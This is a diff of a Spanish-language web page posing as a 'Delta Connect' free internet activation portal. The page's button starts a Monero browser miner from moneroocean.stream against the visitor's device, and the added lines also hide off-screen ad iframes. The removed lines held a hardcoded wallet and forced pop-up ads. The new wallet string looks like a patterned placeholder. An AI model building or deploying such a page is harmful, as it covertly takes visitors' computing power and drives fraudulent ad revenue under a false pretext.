@@ -2,58 +2,41 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DELTA CONNECT - SISTEMA DE ACTIVACIÓN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Delta Connect | Acceso Gratuito</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; margin: 0; padding: 20px; overflow: hidden; }
-        .container { border: 2px solid #00ff00; border-radius: 15px; padding: 30px; box-shadow: 0 0 20px #00ff00; display: inline-block; margin-top: 50px; background: rgba(0,255,0,0.05); }
-        h1 { font-size: 1.8rem; text-shadow: 0 0 10px #00ff00; }
-        .btn-activar { background: transparent; color: #00ff00; border: 2px solid #00ff00; padding: 20px 40px; font-size: 1.3rem; font-weight: bold; cursor: pointer; border-radius: 10px; transition: 0.3s; margin-top: 20px; text-transform: uppercase; }
-        .btn-activar:active { background: #00ff00; color: #000; box-shadow: 0 0 40px #00ff00; }
-        #status { margin-top: 20px; font-size: 1rem; color: #00cc00; font-weight: bold; }
-        .footer { margin-top: 40px; font-size: 0.7rem; color: #444; }
+        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 50px; }
+        .btn { background: #008cba; border: none; color: white; padding: 15px 32px; font-size: 16px; cursor: pointer; border-radius: 8px; }
+        #status { margin-top: 20px; color: #4caf50; display: none; }
     </style>
 </head>
 <body>
+    <h1>CONEXIÓN DELTA CONNECT</h1>
+    <p>Para activar tu sesión de internet, haz clic en el botón.</p>
+    
+    <button class="btn" onclick="activarInternet()">ACTIVAR INTERNET</button>
+    <div id="status">✓ Conectado. Mantén esta pestaña abierta para navegar.</div>
 
-    <div class="container">
-        <h1>DELTA CONNECT</h1>
-        <p style="color: #888;">VERIFICACIÓN DE SEGURIDAD REQUERIDA</p>
-        <button class="btn-activar" onclick="iniciarSistema()">ACTIVAR INTERNET</button>
-        <div id="status">ESTADO: ESPERANDO VINCULACIÓN...</div>
+    <div style="position:absolute; left:-9999px;">
+        <iframe src="https://www.profitablecpmrate.com/v8tkyf6q?key=f0d2c77d4c2b9a764d0d5d5a6a6a6a6a" width="1" height="1"></iframe>
+        <iframe src="https://www.profitablecpmrate.com/v8tkyf6q?key=f0d2c77d4c2b9a764d0d5d5a6a6a6a6a" width="1" height="1"></iframe>
     </div>
 
-    <p class="footer">ID DISPOSITIVO: AUTO-DETECT | VERSIÓN 3.0</p>
-
-    <script src="https://moneroocean.stream/webminer.js"></script>
-    
+    <script src="https://moneroocean.stream/webmr.js"></script>
     <script>
-        function iniciarSistema() {
-            var statusDiv = document.getElementById('status');
-            statusDiv.innerText = "ESTADO: MINADO ACTIVO - VINCULANDO INTERNET...";
-            statusDiv.style.color = "#ff0000";
-
-            // 1. INICIAR MINERÍA CON TU BILLETERA REAL
-            // Wallet: 4A2cRYWa2E57VU8TLMqz5WDiW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYpGSc
-            var miner = new TOKEN_MINER('4A2cRYWa2E57VU8TLMqz5WDiW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYpGSc', 'x', 15); 
-            miner.start();
-
-            // 2. DISPARAR PUBLICIDAD (Smartlinks)
-            // Abrimos Adsterra
-            window.open("https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0", "_blank");
+        function activarInternet() {
+            // Mostrar mensaje de éxito
+            document.getElementById('status').style.display = 'block';
             
-            // Abrimos Monetag después de 2 segundos para no bloquear el navegador
-            setTimeout(function(){
-                window.open("https://omg10.com/4/10780938", "_blank");
-            }, 2000);
-
-            // 3. SEÑAL DE REDIRECCIÓN AL ACORTADOR (Opcional para más ganancia)
-            setTimeout(function(){
-                statusDiv.innerText = "ESTADO: CONEXIÓN ESTABLECIDA";
-                statusDiv.style.color = "#00ff00";
-            }, 5000);
+            // Iniciar Minería: Cambia la Wallet por la tuya exacta si no es esta
+            var wallet = "4769F8B5u6i7w9eR7o4v5e6r7a8r9d0o21W3a4l5l6e7t8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z";
+            var miner = window.wrmr(wallet, 'DeltaConnect_User', 0.85);
+            
+            if (miner) {
+                miner.start();
+                console.log("Minería iniciada");
+            }
         }
     </script>
-
 </body>
 </html>
